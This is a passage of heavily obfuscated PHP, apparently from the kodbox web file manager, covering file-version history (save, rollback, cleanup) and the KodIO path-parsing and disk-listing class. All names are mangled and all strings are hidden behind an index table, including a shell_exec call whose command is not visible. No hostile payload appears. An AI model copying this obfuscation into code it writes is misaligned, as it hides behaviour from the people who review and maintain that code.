($¶åÃĞ¢Ø && $¶åÃĞ¢Ø[$¸—ÕÍì[369]]) { $æ¢ÅÖÁ[rtrim($°ûµº ¸, $¸—ÕÍì[8]) . $¸—ÕÍì[8] . $¶ğˆ­¾] = count($¶åÃĞ¢Ø[$¸—ÕÍì[369]]); } } } return $æ¢ÅÖÁ; } public static function add($Û¼‰ôè€) { $º—ä¿¼™ =& $_SERVER[ì™ı‰º¯]; $°ôë“„š = self::listData($Û¼‰ôè€); if (!$°ôë“„š) { return; } $‘–İÕ·‚ = Model($º—ä¿¼™[766])->get($º—ä¿¼™[1238]); $ŒÓ€¢ = $GLOBALS[$º—ä¿¼™[6]][$º—ä¿¼™[89]][$º—ä¿¼™[1216]]; $Ğï¤Ï•Ê = $‘–İÕ·‚ == $º—ä¿¼™[1239] ? min(5, $ŒÓ€¢) : $ŒÓ€¢; if ($ŒÓ€¢ <= 0) { return; } $Ú¹ßçÃ‚ = IO::info($Û¼‰ôè€); $‡œøìø = $°ôë“„š[$º—ä¿¼™[369]]; if ($Ú¹ßçÃ‚[$º—ä¿¼™[76]] == 0) { return; } if ($Ú¹ßçÃ‚[$º—ä¿¼™[76]] >= 1024 * 1024 * 500) { return !1; } $ÇåØ¹·¼ = IO::hashSimple($Û¼‰ôè€); if ($‡œøìø && $‡œøìø[0][$º—ä¿¼™[177]] == $ÇåØ¹·¼) { return !0; } if (array_key_exists($º—ä¿¼™[203], $Ú¹ßçÃ‚) && !$Ú¹ßçÃ‚[$º—ä¿¼™[203]]) { return !1; } $ˆ€Ù¯®ø = short_id(time()); $¼ÌëÁâÔ = array($º—ä¿¼™[399] => $ˆ€Ù¯®ø, $º—ä¿¼™[177] => $ÇåØ¹·¼, $º—ä¿¼™[32] => $Ú¹ßçÃ‚[$º—ä¿¼™[32]] . $º—ä¿¼™[10] . date($º—ä¿¼™[1240]) . rand_string(1), $º—ä¿¼™[76] => $Ú¹ßçÃ‚[$º—ä¿¼™[76]], $º—ä¿¼™[454] => USER_ID, $º—ä¿¼™[201] => time(), $º—ä¿¼™[1241] => $º—ä¿¼™[12]); IO::mkdir($°ôë“„š[$º—ä¿¼™[1242]]); $ò¥°Ç¸¢ = IO::copy($Û¼‰ôè€, $°ôë“„š[$º—ä¿¼™[1242]], !1, $¼ÌëÁâÔ[$º—ä¿¼™[32]]); if (!$ò¥°Ç¸¢) { self::clearEmptyFolder($°ôë“„š[$º—ä¿¼™[1242]]); return !1; } array_unshift($‡œøìø, $¼ÌëÁâÔ); if (count($‡œøìø) > $Ğï¤Ï•Ê) { $Ùíîº = array_slice($‡œøìø, $Ğï¤Ï•Ê); foreach ($Ùíîº as $¦¡â¥ó¼) { IO::remove($°ôë“„š[$º—ä¿¼™[1242]] . $¦¡â¥ó¼[$º—ä¿¼™[32]]); } $‡œøìø = array_slice($‡œøìø, 0, $Ğï¤Ï•Ê); } return self::saveData($°ôë“„š[$º—ä¿¼™[1243]], $‡œøìø); } public static function remove($áü™ŞÉ, $Ëä˜’Æ¹) { $—í±¥—î =& $_SERVER[ì™ı‰º¯]; $¸ûÓ”Ä“ = self::listData($áü™ŞÉ); $¨üÊÂ©ò = array(); if (!$¸ûÓ”Ä“) { return !1; } foreach ($¸ûÓ”Ä“[$—í±¥—î[369]] as $½‚Ôì) { if ($½‚Ôì[$—í±¥—î[399]] == $Ëä˜’Æ¹) { IO::remove($¸ûÓ”Ä“[$—í±¥—î[1242]] . $½‚Ôì[$—í±¥—î[32]]); continue; } $¨üÊÂ©ò[] = $½‚Ôì; } return self::saveData($¸ûÓ”Ä“[$—í±¥—î[1243]], $¨üÊÂ©ò); } public static function clear($…ÀÂµ©, $„×¿áÂ = true) { $¼ê¨º„ =& $_SERVER[ì™ı‰º¯]; $Í­¼†â¤ = self::listData($…ÀÂµ©, $„×¿áÂ); if (!$Í­¼†â¤) { return !1; } foreach ($Í­¼†â¤[$¼ê¨º„[369]] as $ì†ƒµÄó) { IO::remove($Í­¼†â¤[$¼ê¨º„[1242]] . $ì†ƒµÄó[$¼ê¨º„[32]]); } return self::saveData($Í­¼†â¤[$¼ê¨º„[1243]], array()); } public static function moveHistory($¸è¨ÏÔ, $«“Ø®É… = '', $¡Ó¦­Ë = '') { $›»ËÄÅú =& $_SERVER[ì™ı‰º¯]; $¹°ğ‡Óş = self::listData($¸è¨ÏÔ, !1); if (!$¹°ğ‡Óş || !$¹°ğ‡Óş[$›»ËÄÅú[369]]) { return !1; } $§º‘Ê°Ä = $›»ËÄÅú[1230]; $«“Ø®É… = $«“Ø®É… ? $«“Ø®É… : get_path_this($¸è¨ÏÔ); $¡Ó¦­Ë = $¡Ó¦­Ë ? $¡Ó¦­Ë : $¹°ğ‡Óş[$›»ËÄÅú[1242]]; $‹ûÈàÄà = substr(get_path_this($¹°ğ‡Óş[$›»ËÄÅú[1243]]), 0, -strlen($§º‘Ê°Ä)); foreach ($¹°ğ‡Óş[$›»ËÄÅú[369]] as $É„ˆ÷œÊ => $ıõßÊ€‹) { $”›å¿ãÉ = $«“Ø®É… . substr($ıõßÊ€‹[$›»ËÄÅú[32]], strlen($‹ûÈàÄà)); $“ÆˆŠÓ = IO::move($¹°ğ‡Óş[$›»ËÄÅú[1242]] . $ıõßÊ€‹[$›»ËÄÅú[32]], $¡Ó¦­Ë, !1, $”›å¿ãÉ); if ($“ÆˆŠÓ) { $¹°ğ‡Óş[$›»ËÄÅú[369]][$É„ˆ÷œÊ][$›»ËÄÅú[32]] = $”›å¿ãÉ; } } $¹°ğ‡Óş[$›»ËÄÅú[1243]] = IO::move($¹°ğ‡Óş[$›»ËÄÅú[1243]], $¡Ó¦­Ë, !1, $«“Ø®É… . $§º‘Ê°Ä); self::saveData($¹°ğ‡Óş[$›»ËÄÅú[1243]], $¹°ğ‡Óş[$›»ËÄÅú[369]]); self::clearEmptyFolder($¹°ğ‡Óş[$›»ËÄÅú[1242]]); } public static function rollback($—¨éÎï, $®®ñä“ì) { $÷Óå×‚¡ =& $_SERVER[ì™ı‰º¯]; $­ğ…ÄÌ = self::listData($—¨éÎï); if (!$­ğ…ÄÌ) { return; } $ØöäªÀÒ = IO::info($—¨éÎï); foreach ($­ğ…ÄÌ[$÷Óå×‚¡[369]] as $Á—íÛ± => $ƒ›¿¦…ô) { if ($ƒ›¿¦…ô[$÷Óå×‚¡[399]] == $®®ñä“ì) { self::add($—¨éÎï); $ª¨ÄŸÛ = $­ğ…ÄÌ[$÷Óå×‚¡[1242]] . $ƒ›¿¦…ô[$÷Óå×‚¡[32]]; $êèËàÊñ = IO::copy($ª¨ÄŸÛ, IO::pathFather($—¨éÎï), REPEAT_REPLACE, $ØöäªÀÒ[$÷Óå×‚¡[32]]); if ($êèËàÊñ) { self::remove($—¨éÎï, $®®ñä“ì); } return $êèËàÊñ; } } return !1; } public static function setDetail($õ¸â¤¢Æ, $Øäúˆ¿¬, $Ğ‡Ë˜Æ) { $•·ûƒ¿É =& $_SERVER[ì™ı‰º¯]; $¾×èÖÏ = self::listData($õ¸â¤¢Æ); if (!$¾×èÖÏ) { return; } foreach ($¾×èÖÏ[$•·ûƒ¿É[369]] as $±Ñ¿Øá => $Á£ıø‚ø) { if ($Á£ıø‚ø[$•·ûƒ¿É[399]] == $Øäúˆ¿¬) { $¾×èÖÏ[$•·ûƒ¿É[369]][$±Ñ¿Øá][$•·ûƒ¿É[1241]] = $Ğ‡Ë˜Æ; self::saveData($¾×èÖÏ[$•·ûƒ¿É[1243]], $¾×èÖÏ[$•·ûƒ¿É[369]]); return !0; } } return !1; } public static function fileInfo($—”©¡ùó, $áßùïÊß) { $ƒ×æˆÙø =& $_SERVER[ì™ı‰º¯]; $ÛÅÏè¤µ = self::listData($—”©¡ùó); if (!$ÛÅÏè¤µ) { show_json(LNG($ƒ×æˆÙø[105]), !1); } $ûÁ‡õ±‰ = $ƒ×æˆÙø[12]; foreach ($ÛÅÏè¤µ[$ƒ×æˆÙø[369]] as $ŞãÍ•Ñû => $ÏÁ®ƒÏˆ) { if ($ÏÁ®ƒÏˆ[$ƒ×æˆÙø[399]] != $áßùïÊß) { continue; } $ûÁ‡õ±‰ = $ÛÅÏè¤µ[$ƒ×æˆÙø[1242]] . $ÏÁ®ƒÏˆ[$ƒ×æˆÙø[32]]; break; } if (!$ûÁ‡õ±‰) { show_json(LNG($ƒ×æˆÙø[105]), !1); } return IO::info($ûÁ‡õ±‰); } public static function fileOut($øâ¢öÜ­, $ó—İÛÏÇ, $»¡‰·¶… = false) { $ïôÖ’Ÿ† =& $_SERVER[ì™ı‰º¯]; $Åôï‹Êˆ = self::fileInfo($øâ¢öÜ­, $ó—İÛÏÇ); $ËŞ«°Ò· =& $GLOBALS[$ïôÖ’Ÿ†[7]]; $»¡‰·¶… = isset($ËŞ«°Ò·[$ïôÖ’Ÿ†[1193]]) && $ËŞ«°Ò·[$ïôÖ’Ÿ†[1193]] == 1; if (isset($ËŞ«°Ò·[$ïôÖ’Ÿ†[33]]) && $ËŞ«°Ò·[$ïôÖ’Ÿ†[33]] == $ïôÖ’Ÿ†[1244]) { return IO::fileOutImage($Åôï‹Êˆ[$ïôÖ’Ÿ†[84]], $ËŞ«°Ò·[$ïôÖ’Ÿ†[1245]]); } IO::fileOut($Åôï‹Êˆ[$ïôÖ’Ÿ†[84]], $»¡‰·¶…, get_path_this($øâ¢öÜ­)); } public static function listData($ãåÁŸì, $»ÈšûÏ = true) { $ÂÁáşî¾ =& $_SERVER[ì™ı‰º¯]; if ($»ÈšûÏ && !IO::exist($ãåÁŸì)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($ãåÁŸì, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $Úº‹Ø—Æ = self::pathHistory($ãåÁŸì); $Ãáúªş = array($ÂÁáşî¾[1243] => $Úº‹Ø—Æ . $ÂÁáşî¾[1230], $ÂÁáşî¾[1242] => rtrim(get_path_father($Úº‹Ø—Æ), $ÂÁáşî¾[8]) . $ÂÁáşî¾[8], $ÂÁáşî¾[369] => array()); $®Ş‚ïˆ = IO::getContent($Ãáúªş[$ÂÁáşî¾[1243]]); if ($®Ş‚ïˆ) { $¤×Ìé²ı = json_decode($®Ş‚ïˆ, !0); if (is_array($¤×Ìé²ı)) { $Ãáúªş[$ÂÁáşî¾[369]] = $¤×Ìé²ı; } } return $Ãáúªş; } private static function saveData($ô—Üä—, $§÷ß†) { $ß†¥¬öö =& $_SERVER[ì™ı‰º¯]; self::log($ß†¥¬öö[1246] . $ô—Üä— . $ß†¥¬öö[71] . count($§÷ß†), $ß†¥¬öö[747]); if ($§÷ß†) { return IO::setContent($ô—Üä—, json_encode($§÷ß†)); } $Í¦¼€ù = IO::pathFather($ô—Üä—); IO::remove($ô—Üä—); self::clearEmptyFolder($Í¦¼€ù); return !0; } public static function clearEmptyFolder($œƒ”À¬ù) { $Ç£ñ´¡ğ =& $_SERVER[ì™ı‰º¯]; if (trim($œƒ”À¬ù, $Ç£ñ´¡ğ[8]) == trim(self::$_historyBase, $Ç£ñ´¡ğ[8])) { return; } $–ÁáÃÔÄ = IO::pathFather($œƒ”À¬ù); $û‚Å±½ = IO::has($œƒ”À¬ù, !0); if ($û‚Å±½[$Ç£ñ´¡ğ[207]] > 0 || $û‚Å±½[$Ç£ñ´¡ğ[208]] > 0) { return; } IO::remove($œƒ”À¬ù); self::clearEmptyFolder($–ÁáÃÔÄ); } private static function getBasePath() { $Ë¯¶Ö‰â =& $_SERVER[ì™ı‰º¯]; $¹éÛÏô = Model($Ë¯¶Ö‰â[1247])->get($Ë¯¶Ö‰â[1248]); if ($¹éÛÏô) { if (!IO::exist($¹éÛÏô)) { IO::mkdir($¹éÛÏô); } if (get_path_this($¹éÛÏô) == $Ë¯¶Ö‰â[1233]) { $¹¼´Ûµ = $Ë¯¶Ö‰â[1249] . rand_string(8); @rename($¹éÛÏô, get_path_father($¹éÛÏô) . $Ë¯¶Ö‰â[8] . $¹¼´Ûµ); $¹éÛÏô = DATA_PATH . $¹¼´Ûµ . $Ë¯¶Ö‰â[8]; file_put_contents(DATA_PATH . $Ë¯¶Ö‰â[1183], $Ë¯¶Ö‰â[12]); Model($Ë¯¶Ö‰â[1247])->set($Ë¯¶Ö‰â[1248], $¹éÛÏô); } return $¹éÛÏô; } $¹éÛÏô = DATA_PATH . $Ë¯¶Ö‰â[1249] . rand_string(8) . $Ë¯¶Ö‰â[8]; $¹éÛÏô = IO::mkdir($¹éÛÏô); $¹éÛÏô = rtrim($¹éÛÏô, $Ë¯¶Ö‰â[8]) . $Ë¯¶Ö‰â[8]; file_put_contents($¹éÛÏô . $Ë¯¶Ö‰â[1183], $Ë¯¶Ö‰â[12]); file_put_contents(DATA_PATH . $Ë¯¶Ö‰â[1183], $Ë¯¶Ö‰â[12]); Model($Ë¯¶Ö‰â[1247])->set($Ë¯¶Ö‰â[1248], $¹éÛÏô); return $¹éÛÏô; } } class KodIO { const KOD_SOURCE = "\173\x73\x6f\165\x72\143\145\x7d"; const KOD_USER_RECYCLE = "\173\165\x73\x65\x72\x52\x65\x63\171\x63\x6c\145\175"; const KOD_USER_FAV = "\x7b\x75\163\145\162\x46\x61\166\x7d"; const KOD_USER_FILE_TAG = "\x7b\x75\163\145\162\x46\151\x6c\145\x54\x61\x67\x7d"; const KOD_USER_FILE_TYPE = "\x7b\x75\163\145\162\x46\151\154\x65\124\x79\160\145\x7d"; const KOD_GROUP_ROOT_SELF = "\173\147\x72\x6f\165\x70\x52\157\157\x74\x53\145\x6c\146\x7d"; const KOD_USER_SHARE = "\x7b\x75\163\145\x72\x53\x68\x61\x72\145\175"; const KOD_USER_SHARE_LINK = "\173\165\x73\145\x72\x53\x68\141\162\145\114\151\156\x6b\x7d"; const KOD_USER_SHARE_TO_ME = "\x7b\163\x68\141\x72\x65\x54\x6f\115\x65\x7d"; const KOD_SHARE_ITEM = "\x7b\163\150\141\162\x65\x49\x74\x65\x6d\175"; const KOD_SHARE_LINK = "\173\x73\x68\x61\162\145\111\164\x65\155\114\x69\x6e\x6b\x7d"; const KOD_SEARCH = "\x7b\x73\x65\141\162\x63\x68\x7d"; const KOD_BLOCK = "\x7b\x62\154\x6f\x63\153\175"; const KOD_IO = "\x7b\x69\157\175"; const KOD_USER_RECENT = "\173\x75\x73\145\162\122\x65\156\143\x65\x6e\x74\175"; const KOD_USER_DRIVER = "\173\x64\x72\151\x76\x65\x72\175"; public static function typeList() { $‡¦˜ïæ =& $_SERVER[ì™ı‰º¯]; return array($‡¦˜ïæ[1250] => self::KOD_SOURCE, $‡¦˜ïæ[1251] => self::KOD_USER_RECYCLE, $‡¦˜ïæ[1252] => self::KOD_USER_FAV, $‡¦˜ïæ[1253] => self::KOD_USER_FILE_TAG, $‡¦˜ïæ[1254] => self::KOD_USER_FILE_TYPE, $‡¦˜ïæ[1255] => self::KOD_GROUP_ROOT_SELF, $‡¦˜ïæ[1256] => self::KOD_USER_SHARE, $‡¦˜ïæ[1257] => self::KOD_USER_SHARE_LINK, $‡¦˜ïæ[1258] => self::KOD_USER_SHARE_TO_ME, $‡¦˜ïæ[1259] => self::KOD_SHARE_ITEM, $‡¦˜ïæ[1260] => self::KOD_SHARE_LINK, $‡¦˜ïæ[1261] => self::KOD_SEARCH, $‡¦˜ïæ[1262] => self::KOD_BLOCK, $‡¦˜ïæ[1263] => self::KOD_IO, $‡¦˜ïæ[1264] => self::KOD_USER_RECENT, $‡¦˜ïæ[1265] => self::KOD_USER_DRIVER); } public static function parse($îù’è ) { $è¥ı‰Àí =& $_SERVER[ì™ı‰º¯]; $îù’è  = self::clear($îù’è ); $ÎÌ §–Ñ = array_values(self::typeList()); preg_match($è¥ı‰Àí[1266], $îù’è , $…ì’±‘†); $ëÅ¶ø½‡ = array($è¥ı‰Àí[422] => !1, $è¥ı‰Àí[1267] => !1, $è¥ı‰Àí[419] => !1, $è¥ı‰Àí[84] => $îù’è , $è¥ı‰Àí[1168] => !1, $è¥ı‰Àí[1167] => $è¥ı‰Àí[12]); if (is_array($…ì’±‘†) && count($…ì’±‘†) == 5) { $„±ØÖÍÒ = $è¥ı‰Àí[1268] . $…ì’±‘†[2] . $è¥ı‰Àí[327]; if (in_array($„±ØÖÍÒ, $ÎÌ §–Ñ)) { $ëÅ¶ø½‡[$è¥ı‰Àí[1168]] = $…ì’±‘†[1]; $ëÅ¶ø½‡[$è¥ı‰Àí[33]] = $„±ØÖÍÒ; $ëÅ¶ø½‡[$è¥ı‰Àí[1269]] = substr($„±ØÖÍÒ, 1, -1); $ëÅ¶ø½‡[$è¥ı‰Àí[399]] = $…ì’±‘†[3]; } $ëÅ¶ø½‡[$è¥ı‰Àí[1167]] = $…ì’±‘†[4]; } $ê¿Æ¨¨İ = array($è¥ı‰Àí[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $ëÅ¶ø½‡[$è¥ı‰Àí[1232]] = in_array($ëÅ¶ø½‡[$è¥ı‰Àí[33]], $ê¿Æ¨¨İ); return $ëÅ¶ø½‡; } public static function isTruePath($‹“šÒ) { $‡ëùÈÂÌ =& $_SERVER[ì™ı‰º¯]; if (substr($‹“šÒ, 0, 1) != $‡ëùÈÂÌ[1268]) { return !0; } if (strpos($‹“šÒ, $‡ëùÈÂÌ[408]) === 0) { return !0; } if (strpos($‹“šÒ, $‡ëùÈÂÌ[1236]) === 0) { return !0; } if (strpos($‹“šÒ, $‡ëùÈÂÌ[1270]) === 0) { return !0; } if (strpos($‹“šÒ, $‡ëùÈÂÌ[1271]) === 0) { return !0; } if (strpos($‹“šÒ, $‡ëùÈÂÌ[1272]) === 0) { return !0; } return !1; } public static function clear($˜š³) { $¤‚º…î” =& $_SERVER[ì™ı‰º¯]; $˜š³ = str_replace(array($¤‚º…î”[1077], $¤‚º…î”[231]), $¤‚º…î”[53], $˜š³); $˜š³ = str_replace($¤‚º…î”[97], $¤‚º…î”[8], $˜š³); $—˜êşè = $¤‚º…î”[1273]; if (substr($˜š³, 0, 3) == $¤‚º…î”[1274]) { $˜š³ = substr($˜š³, 3); } while (strstr($˜š³, $—˜êşè)) { $˜š³ = str_replace($—˜êşè, $¤‚º…î”[8], $˜š³); } $˜š³ = preg_replace($¤‚º…î”[1275], $¤‚º…î”[8], $˜š³); if ($˜š³ == $¤‚º…î”[8]) { return $¤‚º…î”[8]; } $˜š³ = rtrim($˜š³, $¤‚º…î”[8]); return $˜š³; } public static function sourceID($÷¹µ½…ƒ) { $îÊÜå Ê =& $_SERVER[ì™ı‰º¯]; $á±ë±³ = self::parse($÷¹µ½…ƒ); if ($á±ë±³[$îÊÜå Ê[33]] !== self::KOD_SOURCE) { show_json(LNG($îÊÜå Ê[1276]), !1); } return $á±ë±³[$îÊÜå Ê[399]]; } public static function make($Àà×ª´à) { if (!$Àà×ª´à) { return !1; } return self::makePath(self::KOD_SOURCE, intval($Àà×ª´à)); } public static function makeShare($˜š‰¹È, $ë›Ê•¯Š) { return self::makePath(self::KOD_SHARE_ITEM, $˜š‰¹È, $ë›Ê•¯Š); } public static function makeFileTypePath($Î†üÑ—½) { return self::makePath(self::KOD_USER_FILE_TYPE, $Î†üÑ—½); } public static function makeFileTagPath($‹äÒ·ÕŸ) { return self::makePath(self::KOD_USER_FILE_TAG, $‹äÒ·ÕŸ); } public static function makePath($’Ûñ¿Ìó, $†²İü÷– = '', $ŠØ¢Ã®Á = '') { $ş£é¾Ô =& $_SERVER[ì™ı‰º¯]; $„«šƒ»û = substr($’Ûñ¿Ìó, 1, -1); $ÀğøĞ² = $ş£é¾Ô[1277] . $„«šƒ»û . $ş£é¾Ô[1278] . $†²İü÷– . $ş£é¾Ô[1279]; $ÀğøĞ² = $ŠØ¢Ã®Á ? $ÀğøĞ² . $ŠØ¢Ã®Á . $ş£é¾Ô[8] : $ÀğøĞ²; return $ÀğøĞ²; } public static function hashPath($ÔÕœÊøû, $¶÷ıòÀ = true) { $­Úñó¹ı =& $_SERVER[ì™ı‰º¯]; $Ù‘’ªû‹ = is_array($ÔÕœÊøû) ? $ÔÕœÊøû : IO::info($ÔÕœÊøû); $Ë’úØ  = _get($Ù‘’ªû‹, $­Úñó¹ı[1280], $­Úñó¹ı[12]); if (!$Ë’úØ  && isset($Ù‘’ªû‹[$­Úñó¹ı[402]])) { $Ù‘’ªû‹ = IO::info(KodIO::make($Ù‘’ªû‹[$­Úñó¹ı[402]])); $Ë’úØ  = _get($Ù‘’ªû‹, $­Úñó¹ı[1280], $­Úñó¹ı[12]); } if (!$Ë’úØ  && $¶÷ıòÀ) { $¬ÕœÃÖ™ = KodIO::parse($Ù‘’ªû‹[$­Úñó¹ı[84]]); if (!$¬ÕœÃÖ™[$­Úñó¹ı[33]]) { $Ë’úØ  = IO::hashSimple($Ù‘’ªû‹[$­Úñó¹ı[84]]); } } if (!$Ë’úØ ) { $Ë’úØ  = md5($Ù‘’ªû‹[$­Úñó¹ı[84]] . $Ù‘’ªû‹[$­Úñó¹ı[76]] . $Ù‘’ªû‹[$­Úñó¹ı[85]]); } return $Ë’úØ ; } public static function hashPathSafe($±ŸÔ–¥ˆ, $Ó¦Ğû¾ = true) { $ŸƒŒóõø =& $_SERVER[ì™ı‰º¯]; $ãººˆíƒ = self::hashPath($±ŸÔ–¥ˆ, $Ó¦Ğû¾); return md5($ãººˆíƒ . $ŸƒŒóõø[1281] . Model($ŸƒŒóõø[766])->get($ŸƒŒóõø[767])); } public static function initSystemPath() { $ŞöÖ§±• =& $_SERVER[ì™ı‰º¯]; if (defined($ŞöÖ§±•[1282])) { return; } define($ŞöÖ§±•[1282], self::systemPath($ŞöÖ§±•[1283])); define($ŞöÖ§±•[1284], self::systemPath($ŞöÖ§±•[1285])); define($ŞöÖ§±•[1286], self::systemPath($ŞöÖ§±•[1287])); define($ŞöÖ§±•[1288], self::systemPath($ŞöÖ§±•[1289])); IOHistory::bindEvent(); } public static function systemPath($Á¼Ú«ÔÙ) { $–à›£ç¶ =& $_SERVER[ì™ı‰º¯]; $’‹«µ±æ = $–à›£ç¶[1290] . ucfirst($Á¼Ú«ÔÙ); $ü¤ŒÎ = Model($–à›£ç¶[766])->get($’‹«µ±æ); if ($ü¤ŒÎ) { return $ü¤ŒÎ; } if ($Á¼Ú«ÔÙ == $–à›£ç¶[1283]) { $ü¤ŒÎ = self::make(Model($–à›£ç¶[821])->systemRootPathAdd($–à›£ç¶[534])); } else { $ü¤ŒÎ = self::systemPath($–à›£ç¶[1283]); $“ùæı = self::sourceID($ü¤ŒÎ); $ü¤ŒÎ = self::make(Model($–à›£ç¶[821])->mkdir($“ùæı, $Á¼Ú«ÔÙ)); } Model($–à›£ç¶[766])->set($’‹«µ±æ, $ü¤ŒÎ); return $ü¤ŒÎ; } public static function systemFolder($ùƒ¾Ó„’) { $ËÖı‘Ş½ = IO_PATH_SYSTEM_SOURCE . $ùƒ¾Ó„’; $Ãäì†” = Cache::get($ËÖı‘Ş½); if (!$Ãäì†”) { $³åÊ¯•ˆ = IO::infoFull($ËÖı‘Ş½); if (!$³åÊ¯•ˆ) { $Ãäì†” = IO::mkdir($ËÖı‘Ş½, REPEAT_SKIP); } else { $Ãäì†” = $³åÊ¯•ˆ[$_SERVER[ì™ı‰º¯][84]]; } Cache::set($ËÖı‘Ş½, $Ãäì†”, 3600 * 10); } return $Ãäì†”; } public static function defaultDriver() { return Model($_SERVER[ì™ı‰º¯][763])->defaultDriver(); } public static function defaultIO() { $“»´Àä =& $_SERVER[ì™ı‰º¯]; $ö×§Ù¼À = self::defaultDriver(); return $“»´Àä[1291] . $ö×§Ù¼À[$“»´Àä[399]] . $“»´Àä[1279]; } public static function defaultDriverInit() { static $çÔ¹àÛ = false; if ($çÔ¹àÛ) { return $çÔ¹àÛ; } $çÔ¹àÛ = IO::init(self::defaultIO()); return $çÔ¹àÛ; } public static function fileTypeList() { $÷ŠÀşøÛ =& $_SERVER[ì™ı‰º¯]; $Ê•œ«Š° = $GLOBALS[$÷ŠÀşøÛ[6]][$÷ŠÀşøÛ[1292]]; foreach ($Ê•œ«Š° as $øØ¥şú¯ => $°Œ÷úà¿) { $³´‚€¬® = $÷ŠÀşøÛ[1293] . $øØ¥şú¯; $î­Ç±ıŞ = LNG($³´‚€¬®); if ($³´‚€¬® != $î­Ç±ıŞ) { $Ê•œ«Š°[$øØ¥şú¯][$÷ŠÀşøÛ[32]] = $î­Ç±ıŞ; } } return $Ê•œ«Š°; } public static function diskList($¯×‰ëŒû = true) { $Ú…¼«Ë = $_SERVER[ì™ı‰º¯][1294]; if ($¯×‰ëŒû) { $©Ì§×Å‡ = Cache::get($Ú…¼«Ë); if (is_array($©Ì§×Å‡)) { return $©Ì§×Å‡; } } $©Ì§×Å‡ = self::diskListGet(); Cache::set($Ú…¼«Ë, $©Ì§×Å‡, 60); return $©Ì§×Å‡; } public static function diskListGet() { $¦˜Í =& $_SERVER[ì™ı‰º¯]; $ú·“©ğ­ = array(); if ($GLOBALS[$¦˜Í[6]][$¦˜Í[1295]] == $¦˜Í[1296]) { $ã€äÏ§ç = $¦˜Í[1297]; for ($×³¹–ê¸ = 0; $×³¹–ê¸ < strlen($ã€äÏ§ç); $×³¹–ê¸++) { $ÚËö¤îË = $ã€äÏ§ç[$×³¹–ê¸] . $¦˜Í[1298]; if (file_exists($ÚËö¤îË)) { $ú·“©ğ­[] = $ÚËö¤îË; } } return $ú·“©ğ­; } if (!function_exists($¦˜Í[98])) { $ú·“©ğ­[] = $¦˜Í[831]; return $ú·“©ğ­; } $Éß£Ü™Æ = explode($¦˜Í[231], shell_exec($¦˜Í[1299])); array_shift($Éß£Ü™Æ); array_pop($Éß£Ü™Æ); $¤êù· = array($¦˜Í[1300], $¦˜Í[1301], $¦˜Í[1302], $¦˜Í[1303], $¦˜Í[1304], $¦˜Í[1305], $¦˜Í[1306], $¦˜Í[1307]); foreach ($Éß£Ü™Æ as $Å¢î›äÙ) { $ÀÈ³†÷” = preg_split($¦˜Í[1308], $Å¢î›äÙ); $ÚËö¤îË = $ÀÈ³†÷”[count($ÀÈ³†÷”) - 1]; if (!strstr($ÀÈ³†÷”[0], $¦˜Í[1309]) || !$ÚËö¤îË) { continue; } $ĞÌÌ‰Í = rtrim($ÚËö¤îË, $¦˜Í[8]) . $¦˜Í[8]; if (in_array($ĞÌÌ‰Í, $¤êù·)) { continue; } $ú·“©ğ­[] = $ĞÌÌ‰Í; } return $ú·“©ğ­; } public static function isSameDisk($¶¶ŒÔÛ, $øİâæ») { $Û¬Â¨£û =& $_SERVER[ì™ı‰º¯]; if ($GLOBALS[$Û¬Â¨£û[6]][$Û¬Â¨£û[1295]] == $Û¬Â¨£û[1296]) { return strtolower(substr($¶¶ŒÔÛ, 0, 1)) == strtolower(substr($øİâæ», 0, 1)); } $ÄŞ’ÓÊå = self::diskList(); $‹‹”¶¦Ú = !1; $ŒÊŒ¸… = !1; sort($ÄŞ’ÓÊå); $ÄŞ’ÓÊå = array_reverse($ÄŞ’ÓÊå); $¶¶ŒÔÛ = rtrim($¶¶ŒÔÛ, $Û¬Â¨£û[8]) . $Û¬Â¨£û[8]; $øİâæ» = rtrim($øİâæ», $Û¬Â¨£û[8]) . $Û¬Â¨£û[8]; foreach ($ÄŞ’ÓÊå as $Š„øéœ) { $ÎñÙ°Òî = strlen($Š„øéœ); if (!$‹‹”¶¦Ú && substr($¶¶ŒÔÛ, 0, $ÎñÙ°Òî) == $Š„øéœ) { $‹‹”¶¦Ú = $Š„øéœ; } if (!$ŒÊŒ¸… && substr($øİâæ», 0, $ÎñÙ°Òî) == $Š„øéœ) { $ŒÊŒ¸… = $Š„øéœ; } if ($‹‹”¶¦Ú && $ŒÊŒ¸…) { break; } } return $‹‹”¶¦Ú === $ŒÊŒ¸…; } public static function transferType($•Ê»õ°¶, $¸ø¸¾×–) { $Í€º§ÏÄ =& $_SERVER[ì™ı‰º¯]; $ºÅ”½ó³ = self::driverType($•Ê»õ°¶); $‘ßĞÏñ­ = self::driverType($¸ø¸¾×–); if ($ºÅ”½ó³[$Í€º§ÏÄ[33]] == $‘ßĞÏñ­[$Í€º§ÏÄ[33]] && $ºÅ”½ó³[$Í€º§ÏÄ[1310]] == $‘ßĞÏñ­[$Í€º§ÏÄ[1310]]) { return $Í€º§ÏÄ[1311]; } if ($ºÅ”½ó³[$Í€º§ÏÄ[33]] == $Í€º§ÏÄ[864] && $‘ßĞÏñ­[$Í€º§ÏÄ[33]] == $Í€º§ÏÄ[106]) { return $Í€º§ÏÄ[1193]; } if ($ºÅ”½ó³[$Í€º§ÏÄ[33]] == $Í€º§ÏÄ[106] && $‘ßĞÏñ­[$Í€º§ÏÄ[33]] == $Í€º§ÏÄ[864]) { return $Í€º§ÏÄ[107]; } return $Í€º§ÏÄ[1312]; } public static function driverType($øİ¼”) { $ÂË¤É“ =& $_SERVER[ì™ı‰º¯]; $¶ÙÏĞ—Ë = str_replace($ÂË¤É“[1313], $ÂË¤É“[12], strtolower($øİ¼”->getType())); if ($¶ÙÏĞ—Ë == $ÂË¤É“[753] || $¶ÙÏĞ—Ë == $ÂË¤É“[1314] || $¶ÙÏĞ—Ë == $ÂË¤É“[1315]) { $øİ¼” = self::defaultDriverInit(); } else { if ($¶ÙÏĞ—Ë == $ÂË¤É“[1203] || $¶ÙÏĞ—Ë == $ÂË¤É“[1316]) { $øİ¼” = IO::init($øİ¼”->pathParse[$ÂË¤É“[1150]]); } } $îßûúùÊ = $øİ¼”->path; $¶ÙÏĞ—Ë = str_replace($ÂË¤É“[1313], $ÂË¤É“[12], strtolower($øİ¼”->getType())); if ($¶ÙÏĞ—Ë == $ÂË¤É“[106]) { return array($ÂË¤É“[33] => 